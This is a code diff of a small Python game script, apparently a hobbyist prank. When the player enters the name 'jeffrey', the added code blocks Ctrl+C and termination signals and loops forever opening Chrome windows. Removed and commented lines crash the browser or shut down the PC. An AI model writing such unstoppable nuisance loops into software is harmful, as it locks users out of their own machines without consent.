@@ -2,6 +2,8 @@ import os
 import time
 import random
 import webbrowser
+import signal
+import playsound3 
 plalislf=0
 plalisud=0
 L=3
@@ -130,10 +132,19 @@ elif playername=="jeffrey":
     #("why do you speak l;ike thatbwhy do you laugh so much well hgod bye ")
     #time.sleep (7)
     #os.system ("shutdown /s /t 1")
+    signal.signal(signal.SIGINT,lambda:0)
+    signal.signal(signal.SIGTERM,lambda:0)
     while True:
-        os.system ("\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" chrome://inducebrowsercrashforrealz ")
+        os.system ("start chrome --new-window \"https://deltarune.wiki/w/Spamton_NEO\" ")
+        os.system ("start chrome --new-window \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" ")
+
+       # playsound3 ('u_edtmwfwu7c-metal-pipe-329305')
         url= "chrome://inducebrowsercrashforrealz"
-        webbrowser.open (url)
+       #c webbrowser.open (url)
+        #\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"  
+
+
+
 
 else:
     print ("good luck and DONT GO CODE MINING")
